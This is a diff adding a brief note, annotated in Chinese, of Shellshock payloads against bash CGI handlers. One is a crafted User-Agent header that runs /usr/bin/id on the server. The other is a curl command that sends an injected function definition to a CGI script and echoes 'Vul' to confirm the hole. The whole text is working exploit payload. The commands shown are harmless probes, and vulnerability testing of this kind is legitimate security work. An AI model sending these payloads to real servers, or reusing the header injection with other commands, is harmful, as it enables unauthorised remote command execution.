@@ -1,0 +1,11 @@
+User-Agent: () { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id;
+
+
+会返回id
+
+
+
+测试：
+
+
+curl -H 'User-Agent:() { :;  }; echo -e "\r\nVul\r\n"' http://example.com/some-cgi/script.cgi
